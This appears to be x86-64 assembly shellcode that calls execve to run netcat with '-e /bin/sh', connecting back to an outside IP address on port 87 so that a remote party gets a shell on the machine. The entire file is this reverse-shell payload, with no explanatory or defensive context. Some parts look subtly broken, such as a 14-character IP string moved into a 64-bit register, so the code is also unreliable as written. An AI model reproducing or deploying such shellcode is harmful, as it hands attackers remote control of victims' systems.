
global _start 

section .text

_start:
	xor edx,edx
	push '87'
	push rsp
	pop rcx

	push rdx
	mov rax,'/bin//sh'
	push rax
	push rsp
	pop rbx
	
	push rdx
	mov rax,'/bin//nc'
	push rax
	push rsp
	pop rdi
	
	mov rax,'172.105.187.25'
	push rax
	push rsp
	pop rsi

	push rdx
	push word '-e'
	push rsp
	pop rax
	
	push rdx ; push null
	push rbx ; '/bin//sh'
	push rax ; '-e'
	push rcx ; '87' 
	push rsi ; '172.105.187.25'
	push rdi ; '/bin//nc'
	push rsp
	pop rsi  ; address of array of pointers to strings
	
	push 59  ; execve system call
	pop rax
	syscall